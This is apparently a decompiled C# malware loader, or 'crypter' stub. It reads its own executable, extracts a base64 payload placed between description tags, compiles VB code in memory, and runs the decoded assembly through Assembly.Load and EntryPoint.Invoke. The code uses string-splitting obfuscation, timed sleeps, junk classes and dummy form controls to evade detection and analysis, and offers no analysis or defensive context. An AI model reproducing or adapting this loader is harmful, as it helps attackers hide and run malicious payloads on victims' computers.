using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace fede;

[StandardModule]
internal sealed class tekno
{
	public class keeeeetch
	{
		[DebuggerNonUserCode]
		public keeeeetch()
		{
		}

		public static object jgddyrs()
		{
			nhsrkvhkvv();
			object result = default(object);
			return result;
		}

		public static object hdjttjdjd()
		{
			jgddyrs();
			object result = default(object);
			return result;
		}

		public static object nhsrkvhkvv()
		{
			asjeageagegaegea.bfdfbbdb();
			object result = default(object);
			return result;
		}
	}

	public class asjeageagegaegea
	{
		[DebuggerNonUserCode]
		public asjeageagegaegea()
		{
		}

		public static object bfdfbbdb()
		{
			jjo();
			object result = default(object);
			return result;
		}
	}

	public static object jjo()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		new CheckBox();
		Thread.Sleep(10);
		CompilerParameters val = new CompilerParameters();
		Thread.Sleep(10);
		val.set_GenerateInMemory(true);
		val.set_CompilerOptions("/optimize+ /platform:x86 /target:library");
		val.get_ReferencedAssemblies().AddRange(new string[6] { "System.dll", "System.Data.dll", "System.Deployment.dll", "System.Drawing.dll", "System.Windows.Forms.dll", "System.Xml.dll" });
		StringBuilder stringBuilder = new StringBuilder();
		new TextBox();
		new TextBox();
		stringBuilder.Append("\r\nImports System, Microsoft.VisualBasic, System.Reflection, System.Diagnostics");
		new TextBox();
		stringBuilder.Append("\r\nModule Yo");
		new TextBox();
		stringBuilder.Append("\r\nSub Main()");
		new TextBox();
		stringBuilder.Append("\r\n        Dim t As New Stopwatch");
		new TextBox();
		stringBuilder.Append("\r\n");
		new TextBox();
		stringBuilder.Append("\r\n        Do Until t.ElapsedMilliseconds >= 20000");
		new TextBox();
		stringBuilder.Append("\r\n           t.Start()");
		stringBuilder.Append("\r\n           System.Threading.Thread.Sleep(1)");
		stringBuilder.Append("\r\n          ");
		stringBuilder.Append("\r\n        Loop");
		stringBuilder.Append("\r\n        t.Stop()");
		stringBuilder.Append("\r\nEnd Sub");
		stringBuilder.Append("\r\nPublic function hard(byval s as Object) As Byte");
		stringBuilder.Append("\r\nreturn Assembly.Load(convert.frombase64string(s)).Entrypoint.Invoke(nothing,nothing)");
		stringBuilder.Append("\r\nend function");
		stringBuilder.Append("\r\nEnd module");
		ArrayList arrayList = new ArrayList();
		arrayList.Add(val);
		arrayList.Add(stringBuilder.ToString());
		return CodeDomProvider.CreateProvider("zB".Replace("z", "V")).CompileAssemblyFromSource((CompilerParameters)arrayList[0], new string[1] { Conversions.ToString(arrayList[1]) }).get_CompiledAssembly()
			.GetType("Yo")!.GetMethod("hard");
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new CheckBox();
		string text = "";
		string text2 = "<descri-".Replace("-", "ption>");
		string value = "</descr-".Replace("-", "iption>");
		FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule!.FileName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			string text3 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text3, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string text4 = text3;
			for (int num = text4.IndexOf(text2) + text2.Length; num != text2.Length - 1; num = text4.IndexOf(text2, num) + text2.Length)
			{
				text = text4.Substring(num, text4.IndexOf(value, num) - num);
			}
			object obj = new string[1] { text };
			Stopwatch stopwatch = new Stopwatch();
			while (stopwatch.ElapsedMilliseconds < 5000L)
			{
				stopwatch.Start();
				Thread.Sleep(10);
			}
			stopwatch.Stop();
			object obj2 = jjo();
			object[] array = new object[2]
			{
				RuntimeHelpers.GetObjectValue(jjo()),
				RuntimeHelpers.GetObjectValue(obj)
			};
			bool[] array2 = new bool[2] { false, true };
			NewLateBinding.LateCall(obj2, (Type)null, "Invoke", array, (string[])null, (Type[])null, array2, true);
			if (array2[1])
			{
				obj = RuntimeHelpers.GetObjectValue(array[1]);
			}
		}
	}
}
